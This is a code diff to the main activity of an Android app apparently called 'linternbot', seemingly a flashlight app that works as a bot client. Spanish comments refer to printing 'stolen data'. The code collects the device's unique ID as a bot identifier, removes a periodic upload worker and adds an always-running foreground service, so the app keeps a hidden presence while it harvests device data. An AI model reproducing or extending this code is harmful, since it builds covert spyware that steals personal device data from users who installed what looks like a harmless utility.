@@ -1,6 +1,5 @@
 package com.linternbot
 
-
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.Context
@@ -14,16 +13,14 @@ import android.util.Log
 import android.view.View.INVISIBLE
 import android.view.View.VISIBLE
 import android.widget.ImageView
-import androidx.work.Data
-import androidx.work.ExistingPeriodicWorkPolicy
-import androidx.work.PeriodicWorkRequest
-import androidx.work.WorkManager
-import java.util.concurrent.TimeUnit
+import androidx.annotation.RequiresApi
+
 
 var idAndroid = ""  // Variable global para almacenar el identificador unico del dispositivo android
 
 class MainActivity : AppCompatActivity() {
 
+    @RequiresApi(Build.VERSION_CODES.O)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
@@ -35,6 +32,7 @@ class MainActivity : AppCompatActivity() {
             contentResolver,
             Settings.Secure.ANDROID_ID
         )
+        ForegroundService.startService(this, "Foreground Service is running...")
 
         button2.visibility = INVISIBLE
 
@@ -54,20 +52,6 @@ class MainActivity : AppCompatActivity() {
                     // Imprime los datos robados para debug
 
                     Log.d("TAG",getSpec())
-
-                    // Codigo para aprender a utilizar worker
-                    // https://developer.android.com/reference/androidx/work/PeriodicWorkRequest
-                    val myWorkBuilder = PeriodicWorkRequest.Builder(UploadWorker::class.java, PeriodicWorkRequest.MIN_PERIODIC_INTERVAL_MILLIS+1, TimeUnit.MILLISECONDS)
-
-                    val data = Data.Builder()
-                    //Add parameter in Data class. just like bundle. You can also add Boolean and Number in parameter.
-                    data.putString("IDbot", idAndroid)
-                    //Set Input Data
-                    myWorkBuilder.setInputData(data.build())
-
-                    val myWork = myWorkBuilder.build()
-                    WorkManager.getInstance().enqueueUniquePeriodicWork("jobTag", ExistingPeriodicWorkPolicy.REPLACE, myWork)
-
 
                 }
                 catch (e: Exception){
